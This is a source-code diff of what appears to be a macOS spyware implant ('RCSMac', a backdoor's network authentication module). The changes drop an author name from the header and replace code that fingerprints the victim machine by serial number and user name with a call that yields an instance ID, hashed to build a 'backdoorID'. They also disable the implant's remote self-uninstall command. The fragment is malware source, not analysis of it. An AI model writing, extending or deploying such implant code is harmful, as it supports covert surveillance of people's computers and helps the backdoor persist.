@@ -2,7 +2,7 @@
  * RCSMac - Authentication Network Operation
  *
  *
- * Created by revenge on 13/01/2011
+ * Created on 13/01/2011
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
@@ -78,15 +78,9 @@
   NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  NSString *serialNumber = getSystemSerialNumber();
-  
-  NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
-   
-  NSString *userName = NSUserName();
-  [_instanceID appendString: userName];
+  NSString *_instanceID = getCurrInstanceID();
   
   NSData *instanceID = [_instanceID sha1Hash];
-  [_instanceID release];
   
   NSMutableData *backdoorID = [[NSMutableData alloc] init];
   
@@ -264,9 +258,9 @@
 #ifdef DEBUG_AUTH_NOP
         infoLog(@"Uninstall");
 #endif
-      
-        RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-        [taskManager uninstallMeh];
+        //XXX-
+//        RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+//        [taskManager uninstallMeh];
       } break;
     case PROTO_NO:
     default:
